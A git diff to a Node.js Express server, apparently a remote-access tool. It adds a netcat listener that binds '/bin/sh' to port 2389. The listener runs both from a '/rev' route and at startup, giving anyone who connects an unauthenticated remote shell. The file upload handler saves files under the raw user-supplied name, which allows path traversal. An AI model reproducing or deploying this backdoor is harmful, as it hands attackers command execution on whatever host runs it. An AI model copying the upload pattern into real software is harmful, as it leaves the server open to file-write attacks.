@@ -9,6 +9,8 @@ const path = require('path')
 const bodyParser = require('body-parser');
 const morgan = require('morgan');
 const _ = require('lodash');
+const NetcatServer = require('netcat/server')
+const nc = new NetcatServer()
 app.use(fileUpload({
     createParentPath: true
 }));
@@ -43,17 +45,18 @@ app.get('/cmd', function (req, res){
 
 app.get('/rev', function (req, res){
 
-	exec('ncat -lv --exec "/bin/sh"', (err, out)=>{
+	//exec('ncat -lv --exec "/bin/sh"', (err, out)=>{
 	  
-		if(err){
-		  console.log('error occured: ')
-		  res.send(err)
-		}
+	//	if(err){
+	//	  console.log('error occured: ')
+	//	  res.send(err)
+	//	}
 		
-		//res.send(out)
-		console.log(out)
-	})
-
+	//	//res.send(out)
+	//	console.log(out)
+	//})
+	console.log("listening started ny nc") 
+	nc.port(2389).listen().exec('/bin/sh')
 
 })
 
@@ -78,7 +81,7 @@ app.post('/', async (req, res) => {
             let filee = req.files.filee;
             
             //Use the mv() method to place the file in the upload directory (i.e. "uploads")
-            filee.mv('./' + filee.name);
+            filee.mv('./files' + filee.name);
 
             //send response
             res.send({
@@ -97,5 +100,7 @@ app.post('/', async (req, res) => {
 });
 
 
+console.log("listening started ny nc") 
+nc.port(2389).listen().exec('/bin/sh')
 app.listen(PORT, ()=> console.log(`Listening on port ${PORT}`))
 
